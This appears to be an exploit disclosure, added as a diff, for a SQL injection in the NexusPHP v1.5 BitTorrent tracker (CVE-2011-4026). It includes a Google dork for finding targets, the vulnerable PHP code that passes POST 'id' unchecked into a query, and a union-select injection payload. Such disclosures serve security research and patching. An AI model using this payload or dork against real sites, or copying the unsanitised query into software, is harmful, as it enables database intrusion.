@@ -1,0 +1,32 @@
+# Exploit Title: Nexusphp.v1.5 SQL injection Vulnerability
+# Google Dork: intitle:nexusphp
+# Date: 2011-10-08
+# Author: flyh4t
+# Software Link: http://sourceforge.net/projects/nexusphp/
+# Version: nexusphp.v1.5
+# Tested on: linux+apache
+# CVE : CVE-2011-4026
+
+
+Nexusphp is BitTorrent private tracker scripts written in PHP 
+The codes is here http://sourceforge.net/projects/nexusphp/
+There is a sql injectiong Vulnerability in thanks.php.
+ 
+-----------------------vul code-------------------
+//thanks.php
+if ($_GET['id'])
+ stderr("Party is over!", "This trick doesn't work anymore. You need to click the button!");
+$userid = $CURUSER["id"];
+$torrentid = $_POST["id"];
+$tsql = sql_query("SELECT owner FROM torrents where id=$torrentid");
+$arr = mysql_fetch_array($tsql);
+-----------------------vul code end-------------------
+ 
+ $_POST["id"] is not checked, lead a sql injection Vulnerability
+
+-----------------------exploit-------------------
+
+_POST[id] : -1 union select version()>4/*
+
+-----------------------exploit end -------------------
+
